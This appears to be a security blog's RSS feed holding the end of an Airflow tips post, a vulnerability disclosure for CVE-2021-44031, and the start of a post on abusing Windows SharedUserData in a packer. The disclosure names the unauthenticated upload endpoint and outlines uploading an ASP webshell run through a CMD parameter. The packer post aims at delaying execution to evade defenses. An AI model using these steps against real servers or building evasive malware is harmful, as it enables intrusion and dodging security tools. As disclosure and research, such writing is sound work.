has-white-color&#34;&gt;).astimezone(&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;&#39;Europe/London&#39;&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;).subtract(hours=&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-pale-pink-color&#34;&gt;1&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;),&lt;br&gt;&amp;nbsp; default_args = default_args,&lt;br&gt;&amp;nbsp; schedule_interval = timedelta(hours=&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-pale-pink-color&#34;&gt;1&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;),&lt;br&gt;)&lt;/mark&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;With this setting, you can introduce a trial task before the current time and you can make sure the time is the same as your local timezone. &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. ExternalTaskSensor Stuck Problem&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;When people design dependent tasks in different dags, the ExternalTaskSensor is a common function to use. But if you do not follow some best practices, it can quite easily get stuck. The main problem relates to the time settings for DAGs. Among the errors that can occur, the most common is where the previous task generates a large middle value and it is impossible to transfer to an external task because of the &lt;a href=&#34;https://airflow.apache.org/docs/stable/_modules/airflow/models/xcom.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;size limitation&lt;/strong&gt;&lt;/a&gt; for middle value storage. &lt;/p&gt;
&lt;p&gt;So, how to best set the time for DAGs? Based on an answer from &lt;a href=&#34;https://stackoverflow.com/questions/46807297/airflow-externaltasksensor-gets-stuck&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;stackoverflow&lt;/strong&gt;&lt;/a&gt;: the DAGs don&amp;rsquo;t need to have the same start_date. If you create your ExternalTaskSensor task without the execution_delta or execution_date_fn, then the two DAGs need to have the same &lt;strong&gt;&lt;em&gt;execution date&lt;/em&gt;&lt;/strong&gt;. It so happens that if two DAGs have the same schedule, a scheduled task running in each interval will have the same execution date.&lt;/p&gt;
&lt;p&gt;The optimal choice is to exclude execution_delta and execution_data_fn if you encounter challenges when computing the time. You should &lt;strong&gt;never manually trigger (in the Links column) the DAG in WebUI&lt;/strong&gt; &lt;strong&gt;if the result will be sent to the next DAG&lt;/strong&gt;. It will generate different execution dates. In practice, I defined the same start_date by setting a specific date. When I start the DAGs in Web UI, I will &lt;strong&gt;press all the DAG buttons&lt;/strong&gt; at the same time if those DAGs are dependent on one other.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/DAGs-View-PNG2.png&#34; alt=&#34;DAGs View PNG2&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;PNG2：&lt;a href=&#34;https://airflow.apache.org/docs/apache-airflow/1.10.4/ui.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;DAGs View&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This is a very brief description of my solutions for the tricky problems I encountered. Thanks for reading!&lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;references&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#references&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;&lt;a href=&#34;https://stackoverflow.com/questions/45568439/how-do-i-trigger-airflow-dag-using-triggerdagrunoperator&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;How do I trigger Airflow -dag using TriggerDagRunOperator&lt;/strong&gt;&lt;/a&gt; - &lt;a href=&#34;https://stackoverflow.com/questions/45568439/how-do-i-trigger-airflow-dag-using-triggerdagrunoperator&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;_I have found following link: https://www.linkedin.com/pulse/airflow-lesson-1-triggerdagrunoperator-siddharth-anand…_stackoverflow.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://stackoverflow.com/questions/46807297/airflow-externaltasksensor-gets-stuck&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;Airflow ExternalTaskSensor gets stuck&lt;/strong&gt;&lt;/a&gt; - &lt;a href=&#34;https://stackoverflow.com/questions/46807297/airflow-externaltasksensor-gets-stuck&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;_I&amp;rsquo;m trying to use ExternalTaskSensor and it gets stuck at poking another DAG&amp;rsquo;s task, which has already been…_stackoverflow.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://medium.com/@delmira91/sensing-the-completion-of-external-airflow-tasks-827344d03142&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;Sensing the completion of external airflow tasks&lt;/strong&gt;&lt;/a&gt; - &lt;a href=&#34;https://medium.com/@delmira91/sensing-the-completion-of-external-airflow-tasks-827344d03142&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;_(Not the best title)_medium.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://towardsdatascience.com/creating-a-dynamic-dag-using-apache-airflow-a7a6f3c434f3&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;Creating a dynamic DAG using Apache Airflow&lt;/strong&gt;&lt;/a&gt; - &lt;a href=&#34;https://towardsdatascience.com/creating-a-dynamic-dag-using-apache-airflow-a7a6f3c434f3&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;_Today we want to share with you one problem we solved by using Apache Airflow. We have a project comprising more than…_towardsdatascience.com&lt;/a&gt;&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>QUEST KACE Desktop Authority Pre-Auth Remote Code Execution (CVE-2021-44031)</title>
      <link>//localhost:1313/articles/2022/09/2022-09-08-quest-kace-desktop-authority-pre-auth-remote-code-execution-cve-2021-44031/</link>
      <pubDate>Thu, 08 Sep 2022 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2022/09/2022-09-08-quest-kace-desktop-authority-pre-auth-remote-code-execution-cve-2021-44031/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Software&lt;/strong&gt;: QUEST KACE Desktop Authority&lt;br&gt;
&lt;strong&gt;Affected Versions&lt;/strong&gt;: 11.1 and earlier.&lt;br&gt;
&lt;strong&gt;Vendor page&lt;/strong&gt;: &lt;a href=&#34;https://www.quest.com/products/kace-desktop-authority/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.quest.com/products/kace-desktop-authority/&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;CVE Reference&lt;/strong&gt;: CVE-2021-44031&lt;br&gt;
&lt;strong&gt;Published&lt;/strong&gt;: 19/11/2021&lt;br&gt;
&lt;strong&gt;CVSS 3.1 Score&lt;/strong&gt;: 9.8 Critical&lt;br&gt;
&lt;strong&gt;Attack Vector&lt;/strong&gt;: Pre-authenticated Remote Code Execution&lt;br&gt;
&lt;strong&gt;Credits&lt;/strong&gt;: Tom Ellson&lt;/p&gt;
&lt;p&gt;JUMPSEC recently discovered multiple vulnerabilities in Quest KACE Desktop Authority 11.1. This is an endpoint management system that is used widely across the globe and is prevalent within a wide range of organisations. A pre-auth remote code execution on the KACE Desktop Authority platform exists in which successful exploitation of these vulnerabilities would allow an adversary to achieve remote code execution without first needing to authenticate to the service.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44031&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44031&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://support.quest.com/essentials/vulnerability-reporting-acknowledgements&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;https://support.quest.com/essentials/vulnerability-reporting-acknowledgements&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://support.quest.com/kace-desktop-authority/kb/336098/quest-response-to-desktop-authority-vulnerabilities-prior-to-11-2&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;https://support.quest.com/kace-desktop-authority/kb/336098/quest-response-to-desktop-authority-vulnerabilities-prior-to-11-2&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;summary&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#summary&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Due to inadequate authorisation controls, an API endpoint lacking correct authorisation checks allows for an unauthenticated user to upload files. It also does not restrict the file types that can be uploaded, therefore any files can be introduced to the system without proper prevention controls.&lt;/p&gt;
&lt;p&gt;By default the KACE service uses Windows IIS, meaning that an ASP file can be uploaded using the vulnerable API endpoint. The file is placed in the images directory on the webroot and the asp code is rendered upon browsing to the file resulting on code execution.&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Attack Analysis&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;attack-analysis&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#attack-analysis&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Within the system, it is possible to upload an image as part of the outlook settings and options within the Desktop Authority console. In an attempt to find machines that can be accessed without authentication, our attention was brought to the &lt;em&gt;dacomponentui&lt;/em&gt; directory, &lt;strong&gt;this directory by default had directory listing enabled.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;From here it was a matter of finding interesting .aspx files as they loaded without authentication being required to the KACE Desktop Authority system. &lt;em&gt;profiles/profileitems/outlooksettings/InsertImage.aspx&lt;/em&gt; stood out. The endpoint allows for file upload to what seemed to be the outlook portion of the application, as described before. &lt;/p&gt;
&lt;p&gt;Further testing was performed on this endpoint and using process monitor we were able to determine the directory to which the files are written to when uploaded using this endpoint. Uploading a file using the &lt;em&gt;InsertImage.aspx&lt;/em&gt; endpoint will input the file into the &lt;em&gt;images&lt;/em&gt; directory and is placed in a folder with a randomly generated GUID.&lt;/p&gt;
&lt;p&gt;Querying the following endpoint will provide the opportunity to upload an image as part of the outlook settings and the folder to be placed in the aforementioned images directory.&lt;/p&gt;
&lt;p&gt;As seen below, it was trivial to upload an ASP file containing code that would render upon accessing the file.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;https://{serverIP}/DesktopAuthorityConsole/dacomponentui/profiles/profileitems/outlooksettings/InsertImage.&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/image-7.png&#34; alt=&#34;image 7&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Following the upload of the file, the GUID is generated and the folder is created in the images directory. The images directory has directory listing on by default.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/image-8.png&#34; alt=&#34;image 8&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;In order to weaponise this, you simply upload a malicious ASP file that allows for code execution. This can be seen below:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/image-9.png&#34; alt=&#34;image 9&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;The flaw with this implementation is threefold. &lt;strong&gt;Firstly&lt;/strong&gt;, the application does not require authentication to access the &lt;em&gt;insertimage.aspx&lt;/em&gt; page. The &lt;em&gt;insertimage.aspx&lt;/em&gt; page should have a valid users session in order to facilitate access. &lt;strong&gt;Secondly&lt;/strong&gt;, the upload functionality is not checking the file type upon upload, meaning any file type can be introduced into the system through this endpoint. &lt;strong&gt;Thirdly&lt;/strong&gt;, the &lt;em&gt;images&lt;/em&gt; directory has directory listing enabled, meaning regardless of the randomly generated GUID, the attacker can still enumerate the directory to which the file is uploaded to. &lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;exploitation&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#exploitation&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Finally, to round this exploit off, I built a python script to automate code execution. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/image-4.png&#34; alt=&#34;image 4&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/image-1.png&#34; alt=&#34;image 1&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;The script makes a request to the Desktop Authority service to retrieve the &lt;em&gt;VIEWSTATE&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/image-1024x150.png&#34; alt=&#34;image&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Once the &lt;em&gt;VIEWSTATE&lt;/em&gt; is scraped from the service, the script then makes a &lt;em&gt;POST&lt;/em&gt; request to upload the file to the &lt;em&gt;insertimage.aspx&lt;/em&gt; page. This takes the &lt;em&gt;VIEWSTATE&lt;/em&gt; parameter and other webfit boundary items in order to successfully upload the malicious asp file (&lt;code&gt;7c1fe428-4524-4c95-b16d-7711e30563bb.asp&lt;/code&gt;) into the images directory. Once the upload has succeeded, a GET request is made to the /images endpoint to enumerate the randomly generated GUIDs that are generated at folder creation time. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/image-10.png&#34; alt=&#34;image 10&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Following this, another GET request is made to GUID, and another to the file name once the script has enumerated it. One final GET request is made to the uploaded ASPX file and appends the CMD parameter to the request, which instructs the ASPX file to run the supplied data within the &lt;em&gt;CMD&lt;/em&gt; parameter. The output is then returned to the user within the CLI.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/image-11.png&#34; alt=&#34;image 11&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Final Thoughts&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;final-thoughts&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#final-thoughts&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;The vendor responded in a timely fashion and provided updates relating to the fix.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Abusing SharedUserData For Defense Evasion and Exploitation</title>
      <link>//localhost:1313/articles/2022/08/2022-08-11-abusing-shareduserdata-for-defense-evasion-and-exploitation-2/</link>
      <pubDate>Thu, 11 Aug 2022 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2022/08/2022-08-11-abusing-shareduserdata-for-defense-evasion-and-exploitation-2/</guid>
      <description>
        
        
        &lt;p&gt;Over the past few weeks, I have been working on a custom packer in my spare time. In doing so, I needed to create a method of delaying execution within the unpacker stub that didn’t use any pre-defined functions. This post documents what I discovered during this project as well as some future plans I have for this method.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;What is SharedUserData and Why does it exist?
&lt;ul&gt;
&lt;li&gt;_KUSER_SHARED_DATA Structure&lt;/li&gt;
&lt;li&gt;KSYSTEM_TIME Structure&lt;/li&gt;
&lt;li&gt;SystemsTime Attribute&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How can this be abused?
&lt;ul&gt;
&lt;li&gt;Get Epoch Time without Function Calls in C&lt;/li&gt;
&lt;li&gt;Time Dependent explout development&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;What is SharedUserData and why does it exist?&lt;span class=&#34;absolute -mt-20&#34; id=&#34;what-is-shareduserdata-and-why-does-it-exist&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#what-is-shareduserdata-and-why-does-it-exist&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;The main purpose of SharedUserData is to provide all windows processes (Windows NT+) with a global and consistent method of obtaining frequently accessed information such as current system time, or interrupt ticks. This is faster than having to incur the performance deficit of making a syscall or calling a function such as &lt;a href=&#34;https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-rtltimetosecondssince1980&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;RtlTimeToSecondsSince1980&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;_KUSER_SHARED_DATA Structure&lt;span class=&#34;absolute -mt-20&#34; id=&#34;_kuser_shared_data-structure&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#_kuser_shared_data-structure&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;The KUSER_SHARED_DATA structure defines a data region that the kernel places at a static address for access within user-mode. It is important to note that this region of memory, when accessed via user-mode, is read only. What’s more interesting is that even though this concept could be optimized, the kernel’s execution still begins with a page defined for this data. However, for backwards compatibility reasons, this has not been done and is very unlikely to change in the future.&lt;/p&gt;
&lt;p&gt;The pre-defined address for access via kernel-mode is defined in wdm.h as KI_USER_SHARED_DATA. When debugging, this is 0xFFDF0000 / 0x00000000FFFFF780 respectively on 32-bit and 64-bit systems. The read-only user-mode address for SharedUserData is 0x7FFE0000, this is static and constant for both 32-bit, and 64-bit Windows systems.&lt;/p&gt;
&lt;p&gt;It is important to note that this structure has had attributes added over the years, below is an example from Windows XP SP2 (&lt;a href=&#34;http://uninformed.org/index.cgi?v=2&amp;amp;a=2&amp;amp;p=15&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;credit&lt;/a&gt;), and the following is from my personal machine which is running Windows 10 Build 19043.&lt;/p&gt;
&lt;h2&gt;_KUSER_SHARED_DATA Structure Windows XP SP2&lt;span class=&#34;absolute -mt-20&#34; id=&#34;_kuser_shared_data-structure-windows-xp-sp2&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#_kuser_shared_data-structure-windows-xp-sp2&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;0:000&amp;gt; dt _KUSER_SHARED_DATA
   &amp;#43;0x000 TickCountLow     : Uint4B
   &amp;#43;0x004 TickCountMultiplier : Uint4B
   &amp;#43;0x008 InterruptTime    : _KSYSTEM_TIME
   &amp;#43;0x014 SystemTime       : _KSYSTEM_TIME
   &amp;#43;0x020 TimeZoneBias     : _KSYSTEM_TIME
   &amp;#43;0x02c ImageNumberLow   : Uint2B
   &amp;#43;0x02e ImageNumberHigh  : Uint2B
   &amp;#43;0x030 NtSystemRoot     : [260] Uint2B
   &amp;#43;0x238 MaxStackTraceDepth : Uint4B
   &amp;#43;0x23c CryptoExponent   : Uint4B
   &amp;#43;0x240 TimeZoneId       : Uint4B
   &amp;#43;0x244 Reserved2        : [8] Uint4B
   &amp;#43;0x264 NtProductType    : _NT_PRODUCT_TYPE
   &amp;#43;0x268 ProductTypeIsValid : UChar
   &amp;#43;0x26c NtMajorVersion   : Uint4B
   &amp;#43;0x270 NtMinorVersion   : Uint4B
   &amp;#43;0x274 ProcessorFeatures : [64] UChar
   &amp;#43;0x2b4 Reserved1        : Uint4B
   &amp;#43;0x2b8 Reserved3        : Uint4B
   &amp;#43;0x2bc TimeSlip         : Uint4B
   &amp;#43;0x2c0 AlternativeArchitecture : _ALTERNATIVE_ARCHITECTURE_TYPE
   &amp;#43;0x2c8 SystemExpirationDate : _LARGE_INTEGER
   &amp;#43;0x2d0 SuiteMask        : Uint4B
   &amp;#43;0x2d4 KdDebuggerEnabled : UChar
   &amp;#43;0x2d5 NXSupportPolicy  : UChar
   &amp;#43;0x2d8 ActiveConsoleId  : Uint4B
   &amp;#43;0x2dc DismountCount    : Uint4B
   &amp;#43;0x2e0 ComPlusPackage   : Uint4B
   &amp;#43;0x2e4 LastSystemRITEventTickCount : Uint4B
   &amp;#43;0x2e8 NumberOfPhysicalPages : Uint4B
   &amp;#43;0x2ec SafeBootMode     : UChar
   &amp;#43;0x2f0 TraceLogging     : Uint4B
   &amp;#43;0x2f8 TestRetInstruction : Uint8B
   &amp;#43;0x300 SystemCall       : Uint4B
   &amp;#43;0x304 SystemCallReturn : Uint4B
   &amp;#43;0x308 SystemCallPad    : [3] Uint8B
   &amp;#43;0x320 TickCount        : _KSYSTEM_TIME
   &amp;#43;0x320 TickCountQuad    : Uint8B
   &amp;#43;0x330 Cookie           : Uint4B&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;h2&gt;_KUSER_SHARED_DATA Structure Windows 10 Build 19043&lt;span class=&#34;absolute -mt-20&#34; id=&#34;_kuser_shared_data-structure-windows-10-build-19043&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#_kuser_shared_data-structure-windows-10-build-19043&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;As you can see, backwards compatibility has been taken into consideration here. This is due to the attributes ranging from 0x000 -&amp;gt; 0x330 are exactly the same, the only difference is that Windows 10 seems to have extra attributes appended to the end of the structure.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;0:000&amp;gt; dt _KUSER_SHARED_DATA
ntdll!_KUSER_SHARED_DATA
   &amp;#43;0x000 TickCountLowDeprecated : Uint4B
   &amp;#43;0x004 TickCountMultiplier : Uint4B
   &amp;#43;0x008 InterruptTime    : _KSYSTEM_TIME
   &amp;#43;0x014 SystemTime       : _KSYSTEM_TIME
   &amp;#43;0x020 TimeZoneBias     : _KSYSTEM_TIME
   &amp;#43;0x02c ImageNumberLow   : Uint2B
   &amp;#43;0x02e ImageNumberHigh  : Uint2B
   &amp;#43;0x030 NtSystemRoot     : [260] Wchar
   &amp;#43;0x238 MaxStackTraceDepth : Uint4B
   &amp;#43;0x23c CryptoExponent   : Uint4B
   &amp;#43;0x240 TimeZoneId       : Uint4B
   &amp;#43;0x244 LargePageMinimum : Uint4B
   &amp;#43;0x248 AitSamplingValue : Uint4B
   &amp;#43;0x24c AppCompatFlag    : Uint4B
   &amp;#43;0x250 RNGSeedVersion   : Uint8B
   &amp;#43;0x258 GlobalValidationRunlevel : Uint4B
   &amp;#43;0x25c TimeZoneBiasStamp : Int4B
   &amp;#43;0x260 NtBuildNumber    : Uint4B
   &amp;#43;0x264 NtProductType    : _NT_PRODUCT_TYPE
   &amp;#43;0x268 ProductTypeIsValid : UChar
   &amp;#43;0x269 Reserved0        : [1] UChar
   &amp;#43;0x26a NativeProcessorArchitecture : Uint2B
   &amp;#43;0x26c NtMajorVersion   : Uint4B
   &amp;#43;0x270 NtMinorVersion   : Uint4B
   &amp;#43;0x274 ProcessorFeatures : [64] UChar
   &amp;#43;0x2b4 Reserved1        : Uint4B
   &amp;#43;0x2b8 Reserved3        : Uint4B
   &amp;#43;0x2bc TimeSlip         : Uint4B
   &amp;#43;0x2c0 AlternativeArchitecture : _ALTERNATIVE_ARCHITECTURE_TYPE
   &amp;#43;0x2c4 BootId           : Uint4B
   &amp;#43;0x2c8 SystemExpirationDate : _LARGE_INTEGER
   &amp;#43;0x2d0 SuiteMask        : Uint4B
   &amp;#43;0x2d4 KdDebuggerEnabled : UChar
   &amp;#43;0x2d5 MitigationPolicies : UChar
   &amp;#43;0x2d5 NXSupportPolicy  : Pos 0, 2 Bits
   &amp;#43;0x2d5 SEHValidationPolicy : Pos 2, 2 Bits
   &amp;#43;0x2d5 CurDirDevicesSkippedForDlls : Pos 4, 2 Bits
   &amp;#43;0x2d5 Reserved         : Pos 6, 2 Bits
   &amp;#43;0x2d6 CyclesPerYield   : Uint2B
   &amp;#43;0x2d8 ActiveConsoleId  : Uint4B
   &amp;#43;0x2dc DismountCount    : Uint4B
   &amp;#43;0x2e0 ComPlusPackage   : Uint4B
   &amp;#43;0x2e4 LastSystemRITEventTickCount : Uint4B
   &amp;#43;0x2e8 NumberOfPhysicalPages : Uint4B
   &amp;#43;0x2ec SafeBootMode     : UChar
   &amp;#43;0x2ed VirtualizationFlags : UChar
   &amp;#43;0x2ee Reserved12       : [2] UChar
   &amp;#43;0x2f0 SharedDataFlags  : Uint4B
   &amp;#43;0x2f0 DbgErrorPortPresent : Pos 0, 1 Bit
   &amp;#43;0x2f0 DbgElevationEnabled : Pos 1, 1 Bit
   &amp;#43;0x2f0 DbgVirtEnabled   : Pos 2, 1 Bit
   &amp;#43;0x2f0 DbgInstallerDetectEnabled : Pos 3, 1 Bit
   &amp;#43;0x2f0 DbgLkgEnabled    : Pos 4, 1 Bit
   &amp;#43;0x2f0 DbgDynProcessorEnabled : Pos 5, 1 Bit
   &amp;#43;0x2f0 DbgConsoleBrokerEnabled : Pos 6, 1 Bit
   &amp;#43;0x2f0 DbgSecureBootEnabled : Pos 7, 1 Bit
   &amp;#43;0x2f0 DbgMultiSessionSku : Pos 8, 1 Bit
   &amp;#43;0x2f0 DbgMultiUsersInSessionSku : Pos 9, 1 Bit
   &amp;#43;0x2f0 DbgStateSeparationEnabled : Pos 10, 1 Bit
   &amp;#43;0x2f0 SpareBits        : Pos 11, 21 Bits
   &amp;#43;0x2f4 DataFlagsPad     : [1] Uint4B
   &amp;#43;0x2f8 TestRetInstruction : Uint8B
   &amp;#43;0x300 QpcFrequency     : Int8B
   &amp;#43;0x308 SystemCall       : Uint4B
   &amp;#43;0x30c Reserved2        : Uint4B
   &amp;#43;0x310 SystemCallPad    : [2] Uint8B
   &amp;#43;0x320 TickCount        : _KSYSTEM_TIME
   &amp;#43;0x320 TickCountQuad    : Uint8B
   &amp;#43;0x320 ReservedTickCountOverlay : [3] Uint4B
   &amp;#43;0x32c TickCountPad     : [1] Uint4B
   &amp;#43;0x330 Cookie           : Uint4B
   &amp;#43;0x334 CookiePad        : [1] Uint4B
   &amp;#43;0x338 ConsoleSessionForegroundProcessId : Int8B
   &amp;#43;0x340 TimeUpdateLock   : Uint8B
   &amp;#43;0x348 BaselineSystemTimeQpc : Uint8B
   &amp;#43;0x350 BaselineInterruptTimeQpc : Uint8B
   &amp;#43;0x358 QpcSystemTimeIncrement : Uint8B
   &amp;#43;0x360 QpcInterruptTimeIncrement : Uint8B
   &amp;#43;0x368 QpcSystemTimeIncrementShift : UChar
   &amp;#43;0x369 QpcInterruptTimeIncrementShift : UChar
   &amp;#43;0x36a UnparkedProcessorCount : Uint2B
   &amp;#43;0x36c EnclaveFeatureMask : [4] Uint4B
   &amp;#43;0x37c TelemetryCoverageRound : Uint4B
   &amp;#43;0x380 UserModeGlobalLogger : [16] Uint2B
   &amp;#43;0x3a0 ImageFileExecutionOptions : Uint4B
